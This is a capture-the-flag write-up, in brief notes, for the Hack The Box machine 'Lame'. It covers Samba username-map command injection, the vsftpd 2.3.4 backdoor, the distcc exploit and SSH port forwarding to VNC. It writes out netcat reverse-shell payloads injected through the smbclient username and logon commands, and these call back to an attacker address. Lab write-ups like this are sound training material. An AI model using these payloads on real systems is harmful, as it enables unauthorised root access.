# Summary
- User: Samba "username map script" RCE vulnerability allows you to immediately acquire `root`
- Root: see above

# Details
### User
- portscan reveals ports 21, 22, 139, 445, and 3262 are open
- easiest path to `root` is to use the Samba "username map script" RCE exploit to get code execution as `root`
	- Samba version allows for username mapping with a script that is possible to inject commands into
	- can use `smbclient -L lame.htb -U <username>` to inject commands in the username field
	- ```smbclient -L lame.htb -U './=`nc 10.10.14.114 443 -e /bin/bash`'``` doesn't work because the start of the command gets mysteriously capitalized when trying to pass in the option to execute a command on connect (permits raw connections)
	- possible to first connect with `smbclient //lame.htb/tmp` before switching users by using ```logon "./=`nc 10.10.14.114 443 -e /bin/bash`"```
	- https://0xdf.gitlab.io/2020/04/07/htb-lame.html
- port 21 is running `vsftpd 2.3.4` which has a backdoor in it that opens a listener on port 6200 if a username is sent that ends with ":)"
- box is running a firewall that prevents access to the listener on port 6200, so can't use externally
- also possible to get a reverse shell on the box using the `distCC` exploit (CVE-2004-2687)

### Root
- can elevate directly to `root` using the previously mentioned Samba exploit
- alternatively can elevate permissions through the `vsftpd` vulnerability now that the backdoor is reachable
- can also set up remote port forwarding in order to bypass the firewall on the box and access the VNC on port 5900 running as `root`
	- password for VNC is "password", which was also among the passwords retrieved from hashes pulled out of the MySQL instance
	- `ssh -R 10.10.14.114:5900:localhost:5900 -p 9999 portforward@10.10.14.114`
